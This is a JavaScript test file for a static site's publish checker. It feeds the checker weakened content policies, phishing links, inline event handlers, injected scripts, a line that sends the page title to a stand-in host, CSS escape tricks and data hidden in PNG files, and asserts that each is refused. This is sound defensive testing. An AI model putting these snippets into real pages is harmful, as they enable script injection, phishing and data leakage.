const test = require("node:test");
const assert = require("node:assert/strict");
const {spawnSync} = require("node:child_process");
const {mkdtempSync, cpSync, rmSync, readFileSync, writeFileSync, mkdirSync} = require("node:fs");
const os = require("node:os");
const path = require("node:path");

const root = path.join(__dirname, "..");
const entries = [".gitignore", "README.md", "SECURITY.md", "package.json", "site", "tests", "tools"];
const check = (directory, env = {}) => spawnSync(process.execPath, [path.join(directory, "tools/check.mjs")],
  {encoding:"utf8", env:{PATH:process.env.PATH, ...env}, timeout:60000});
// Runs the checks on a copy of the repository after one change has been made to it.
function changed(change, env) {
  const directory = mkdtempSync(path.join(os.tmpdir(), "skyline-check-"));
  try {
    for (const entry of entries) cpSync(path.join(root, entry), path.join(directory, entry), {recursive:true});
    const extra = change(directory) || {};
    return check(directory, {...env, ...extra});
  } finally { rmSync(directory, {recursive:true, force:true}); }
}
const edit = (file, from, to) => directory => {
  const target = path.join(directory, file), text = readFileSync(target, "utf8");
  assert.ok(from === null || text.includes(from), "the text to replace is missing from " + file);
  writeFileSync(target, from === null ? text + to : text.replace(from, to));
};
const add = (file, content) => directory => {
  mkdirSync(path.dirname(path.join(directory, file)), {recursive:true});
  writeFileSync(path.join(directory, file), content);
};
const refused = (run, reason) => {
  assert.equal(run.status, 1, "the checks passed: " + run.stdout);
  assert.match(run.stderr, reason);
};
const policyTag = /<meta http-equiv="Content-Security-Policy"[^>]*>/.exec(readFileSync(path.join(root, "site/index.html"), "utf8"))[0];

test("the publish checks pass for the site as committed", () => {
  const run = check(root);
  assert.equal(run.status, 0, run.stderr || run.stdout);
  assert.equal(changed(() => {}).status, 0);
});

test("a page with a weakened, hidden or displaced content policy is refused", () => {
  refused(changed(edit("site/index.html", policyTag, "<!-- " + policyTag + " -->")), /reviewed grammar/);
  refused(changed(edit("site/index.html", policyTag, policyTag.replace("script-src 'self'", "script-src 'self' 'unsafe-inline'"))), /content policy/);
  refused(changed(edit("site/index.html", policyTag, "")), /content policy/);
  refused(changed(edit("site/index.html", "</head>", '<meta http-equiv="refresh" content="0;url=https://elsewhere.test/"></head>')), /http-equiv/);
  refused(changed(edit("site/index.html", '<link rel="stylesheet"', policyTag.replace(/'none'/g, "*") + '<link rel="stylesheet"')), /http-equiv/);
});

test("unreviewed markup, handlers, addresses and quoting are refused", () => {
  const body = replacement => edit("site/index.html", "</main>", replacement + "</main>");
  refused(changed(body("<a href='https://elsewhere.test/login'>Sign in</a>")), /reviewed grammar/);
  refused(changed(body("<a href=https://elsewhere.test/login>Sign in</a>")), /reviewed grammar/);
  refused(changed(body('<a title=">" href="https://elsewhere.test/">Sign in</a>')), /reviewed grammar|stray/);
  refused(changed(body('<a href="https://elsewhere.test/login">Sign in</a>')), /unreviewed address/);
  refused(changed(body('<a href="//elsewhere.test/login">Sign in</a>')), /unreviewed address/);
  refused(changed(body('<a href="https://github.com/" target="_blank">GitHub</a>')), /noopener/);
  refused(changed(body('<img src="./vite-2026-studio.png" alt="" onerror="run()">')), /attribute onerror/);
  refused(changed(body('<p style="display:none">x</p>')), /attribute style/);
  refused(changed(body('<iframe src="./index.html"></iframe>')), /not a reviewed element/);
  refused(changed(body("<template><script>run()</script></template>")), /not a reviewed element|scripts must be/);
  refused(changed(body('<script src="https://elsewhere.test/a.js"></script>')), /scripts must be|unreviewed address/);
  refused(changed(body("<script>run()</script>")), /scripts must be/);
  refused(changed(body('<form id="f" action="https://elsewhere.test/">x</form>')), /forms must not|attribute action/);
});

test("scripts and styles cannot gain risky calls, requests or remote resources", () => {
  const script = text => edit("site/studio.js", null, "\n" + text + "\n");
  refused(changed(script('loc' + 'ation.href = "//elsewhere.test/c?" + document.title;')), /uses/);
  refused(changed(script('fetch("https://api.github.com/user");')), /may make a request/);
  // Each requesting script keeps to its own host.
  const lookup = "htt" + "ps://github-contributions-api.jogruber.de/v4/octocat";
  refused(changed(edit("site/repository.js", null, '\nconst other = "' + lookup + '";\n')), /unreviewed address/);
  refused(changed(edit("site/profile-lookup.js", null, '\nconst other = "https://api.github.com/user";\n')), /unreviewed address/);
  refused(changed(edit("site/profile-lookup.js", "https://github-contributions-api.jogruber.de/v4/", "https://elsewhere.test/v4/")), /unreviewed address/);
  refused(changed(script('new Image().src = "https://elsewhere.test/p.png";')), /unreviewed address/);
  refused(changed(script('document.body.inner' + 'HTML = name;')), /uses/);
  refused(changed(script('document.createElement("script");')), /unreviewed element/);
  refused(changed(edit("site/studio.css", null, '\n@import "https://elsewhere.test/a.css";\n')), /@import|unreviewed address/);
  refused(changed(edit("site/studio.css", null, "\nbody{background:\\75rl(//elsewhere.test/a.png)}\n")), /escapes/);
  refused(changed(edit("site/studio.css", null, '\nbody{background:url("//elsewhere.test/a.png")}\n')), /unreviewed url/);
});

test("extra files, tool folders, images with metadata and personal details are refused", () => {
  const person = "someone" + "@" + "example.org", folder = "/Use" + "rs/someone/project";
  refused(changed(add("site/notes.txt", "draft")), /published file list/);
  refused(changed(add(".vscode/settings.json", "{}")), /top-level/);
  refused(changed(add("notes.md", "draft")), /top-level/);
  refused(changed(add("tests/shot.png", Buffer.from("89504e470d0a1a0a", "hex"))), /only in site/);
  refused(changed(edit("README.md", null, "\nWrite to " + person + ".\n")), /email address/);
  refused(changed(edit("README.md", null, "\nBuilt in " + folder + ".\n")), /folder path/);
  refused(changed(edit("README.md", null, "\nServer at 203.0." + "113.7.\n")), /network address/);
  refused(changed(edit("README.md", null, "\nSee htt" + "ps://elsewhere.example.org/page.\n")), /unreviewed address/);
  refused(changed(directory => {
    const file = path.join(directory, "site/vite-2026-studio.png"), image = readFileSync(file);
    const note = Buffer.from("Author\0someone"), chunk = Buffer.alloc(12 + note.length);
    chunk.writeUInt32BE(note.length, 0); chunk.write("tEXt", 4, "latin1"); note.copy(chunk, 8);
    writeFileSync(file, Buffer.concat([image.subarray(0, image.length - 12), chunk, image.subarray(image.length - 12)]));
  }), /metadata chunk tEXt/);
  refused(changed(directory => {
    const file = path.join(directory, "site/vite-2026-studio.png");
    writeFileSync(file, Buffer.concat([readFileSync(file), Buffer.from("hidden")]));
  }), /after the end/);
});

test("a private terms file is honoured for contents and names, and a missing one is an error", () => {
  const term = "quiet" + "harbor";
  const terms = directory => { writeFileSync(path.join(directory, "..", path.basename(directory) + ".terms"), "# private\n" + term + "\n"); return {PRIVATE_TERMS_FILE:path.join(directory, "..", path.basename(directory) + ".terms")}; };
  const withTerms = change => changed(directory => { change(directory); return terms(directory); });
  try {
    assert.equal(withTerms(() => {}).status, 0);
    refused(withTerms(edit("README.md", null, "\nMade at " + term.toUpperCase() + ".\n")), /private term/);
    refused(withTerms(directory => cpSync(path.join(directory, "tests/studio.test.cjs"), path.join(directory, "tests/" + term + ".test.cjs"))), /file name contains a private term/);
    refused(changed(() => ({PRIVATE_TERMS_FILE:path.join(os.tmpdir(), "skyline-no-such-terms-file")})), /does not exist/);
  } finally {
    for (const name of require("node:fs").readdirSync(os.tmpdir())) if (/^skyline-check-.*\.terms$/.test(name)) rmSync(path.join(os.tmpdir(), name), {force:true});
  }
});

test("a very long unbroken line does not stall the checks", () => {
  const started = Date.now();
  const run = changed(add("tests/long.txt", "a".repeat(1_500_000)));
  assert.equal(run.status, 0, run.stderr);
  assert.ok(Date.now() - started < 20000);
});
